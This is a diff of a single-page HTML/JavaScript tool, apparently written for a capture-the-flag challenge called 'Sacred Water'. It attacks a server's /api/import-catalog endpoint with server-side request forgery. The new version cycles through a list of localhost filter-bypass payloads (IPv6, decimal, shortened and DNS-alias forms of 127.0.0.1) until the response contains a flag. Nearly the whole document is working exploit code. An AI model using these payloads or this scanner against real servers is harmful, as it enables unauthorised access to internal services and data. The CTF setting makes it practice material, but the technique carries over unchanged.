@@ -1,95 +1,105 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="th">
 <head>
     <meta charset="UTF-8">
-    <title>Sacred Water SSRF Exploit Tool</title>
+    <title>Sacred Water SSRF Scanner</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: #e0e0e0; padding: 40px; }
-        .container { max-width: 800px; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 10px; border: 1px solid #333; }
-        h2 { color: #ffca28; border-bottom: 2px solid #ffca28; padding-bottom: 10px; }
-        .form-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; color: #aaa; }
-        input { width: 100%; padding: 10px; background: #2c2c2c; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box; }
-        button { padding: 10px 20px; background: #ffca28; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        button:hover { background: #ffd54f; }
-        .payload-list { margin-top: 20px; display: flex; gap: 10px; flex-wrap: wrap; }
-        .payload-btn { background: #333; color: #ffca28; border: 1px solid #ffca28; font-size: 12px; }
-        #result { margin-top: 20px; background: #000; padding: 15px; border-radius: 5px; white-space: pre-wrap; font-family: monospace; color: #00ff00; border: 1px solid #00ff00; min-height: 100px; overflow-x: auto; }
-        .info { font-size: 13px; color: #888; margin-top: 10px; }
+        body { font-family: 'Courier New', Courier, monospace; background: #0d1117; color: #58a6ff; padding: 20px; }
+        .container { max-width: 900px; margin: auto; background: #161b22; padding: 20px; border-radius: 8px; border: 1px solid #30363d; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
+        h1 { color: #f0883e; text-align: center; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
+        .input-group { margin: 15px 0; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; }
+        input { width: 100%; padding: 12px; background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; border-radius: 4px; box-sizing: border-box; }
+        .actions { display: flex; gap: 10px; margin-top: 20px; }
+        button { flex: 1; padding: 12px; cursor: pointer; border: none; border-radius: 4px; font-weight: bold; transition: 0.3s; }
+        .btn-scan { background: #238636; color: white; }
+        .btn-scan:hover { background: #2ea043; }
+        #results { margin-top: 20px; }
+        .result-item { background: #0d1117; border: 1px solid #30363d; padding: 10px; margin-bottom: 10px; border-radius: 4px; }
+        .status-200 { border-left: 5px solid #238636; }
+        .status-error { border-left: 5px solid #da3633; }
+        pre { white-space: pre-wrap; word-wrap: break-word; font-size: 12px; color: #8b949e; }
+        .flag-highlight { color: #f0883e; font-size: 1.2em; font-weight: bold; background: rgba(240,136,62,0.1); padding: 5px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>Sacred Water: SSRF Exploit Tool</h2>
-    <p>ระบบแจ้งว่า "Internal addresses are blocked" แต่เราจะใช้เทคนิค Bypass เพื่อหา Flag</p>
+    <h1>🌊 Sacred Water SSRF Exploit</h1>
+    <p style="text-align: center; color: #8b949e;">Bypassing Internal Address Filters</p>
 
-    <div class="form-group">
-        <label>Target URL (Base Address)</label>
-        <input type="text" id="targetHost" placeholder="http://34.x.x.x:3000" value="">
+    <div class="input-group">
+        <label>Target URL (เว็บโจทย์):</label>
+        <input type="text" id="targetUrl" placeholder="http://34.x.x.x:3000" value="">
     </div>
 
-    <div class="form-group">
-        <label>SSRF Payload (Internal Resource)</label>
-        <input type="text" id="internalPath" placeholder="http://127.0.0.1/flag" value="http://127.0.0.1/flag">
+    <div class="actions">
+        <button class="btn-scan" onclick="startScan()">เริ่ม Scan หา Flag</button>
     </div>
 
-    <button onclick="runExploit()">Execute SSRF</button>
-
-    <div class="payload-list">
-        <button class="payload-btn" onclick="setPayload('http://127.0.0.1/flag')">Standard Localhost</button>
-        <button class="payload-btn" onclick="setPayload('http://localhost/flag')">Localhost Alias</button>
-        <button class="payload-btn" onclick="setPayload('http://0.0.0.0/flag')">0.0.0.0 Bypass</button>
-        <button class="payload-btn" onclick="setPayload('http://127.1/flag')">Decimal Bypass</button>
-        <button class="payload-btn" onclick="setPayload('http://[::1]/flag')">IPv6 Bypass</button>
-        <button class="payload-btn" onclick="setPayload('http://localtest.me/flag')">DNS Bypass</button>
-    </div>
-
-    <div id="result">Results will appear here...</div>
-    
-    <div class="info">
-        <strong>💡 Hint:</strong> ในโจทย์ CTF ส่วนใหญ่ Flag มักอยู่ที่ <code>/flag</code>, <code>/admin</code> หรือ <code>/api/internal/flag</code> บน localhost
-    </div>
+    <div id="results">
+        </div>
 </div>
 
 <script>
-    function setPayload(p) {
-        document.getElementById('internalPath').value = p;
-    }
+    // รายการ Payload สำหรับ Bypass Filter
+    const payloads = [
+        "http://127.0.0.1/flag.txt",
+        "http://localhost/flag.txt",
+        "http://0.0.0.0/flag.txt",
+        "http://[::]/flag.txt",
+        "http://[::1]/flag.txt",
+        "http://127.1/flag.txt",
+        "http://2130706433/flag.txt", // 127.0.0.1 in decimal
+        "http://localtest.me/flag.txt",
+        "http://0/flag.txt"
+    ];
 
-    async function runExploit() {
-        const host = document.getElementById('targetHost').value.trim();
-        const internal = document.getElementById('internalPath').value.trim();
-        const resultDiv = document.getElementById('result');
-
-        if (!host) {
-            alert("กรุณาใส่ Target Host (IP ของ Server โจทย์)");
+    async function startScan() {
+        const target = document.getElementById('targetUrl').value.trim();
+        const resultsDiv = document.getElementById('results');
+        
+        if (!target) {
+            alert("ใส่ URL ของเว็บโจทย์ก่อนครับ!");
             return;
         }
 
-        resultDiv.textContent = "🚀 Launching SSRF Attack...";
-        resultDiv.style.color = "#00ff00";
+        resultsDiv.innerHTML = "<h3>กำลังสแกน...</h3>";
 
-        try {
-            const response = await fetch(`${host}/api/import-catalog`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ url: internal })
-            });
+        for (const url of payloads) {
+            const item = document.createElement('div');
+            item.className = 'result-item';
+            item.innerHTML = `<strong>Testing:</strong> ${url}...`;
+            resultsDiv.prepend(item);
 
-            const data = await response.json();
-            
-            // แสดงผลลัพธ์ที่ดึงมาจาก SSRF
-            resultDiv.textContent = "Status: " + response.status + "\n\nResponse Content:\n" + JSON.stringify(data, null, 2);
-            
-            if (JSON.stringify(data).includes("web{")) {
-                resultDiv.style.border = "2px solid #ffca28";
-                alert("🚩 FLAG FOUND!");
+            try {
+                const resp = await fetch(`${target}/api/import-catalog`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ url: url })
+                });
+
+                const data = await resp.json();
+                
+                let content = JSON.stringify(data, null, 2);
+                let isFlag = content.includes("web{");
+
+                item.classList.add(resp.ok ? 'status-200' : 'status-error');
+                item.innerHTML = `
+                    <strong>Payload:</strong> ${url} <br>
+                    <strong>HTTP:</strong> ${resp.status} <br>
+                    <pre>${isFlag ? '<span class="flag-highlight">' + content + '</span>' : content}</pre>
+                `;
+
+                if (isFlag) {
+                    alert("🚩 เจอ Flag แล้ว! ตรวจสอบที่รายการบนสุด");
+                    break; // หยุดสแกนเมื่อเจอ Flag
+                }
+
+            } catch (err) {
+                item.classList.add('status-error');
+                item.innerHTML += `<br><span style="color:#da3633;">Network Error: ${err.message}</span>`;
             }
-
-        } catch (err) {
-            resultDiv.textContent = "❌ Error: " + err.message + "\n\nตรวจสอบว่า Target Host ถูกต้องและเปิด CORS หรือไม่ (หากรันจาก Local ไฟล์)";
-            resultDiv.style.color = "#ff4444";
         }
     }
 </script>
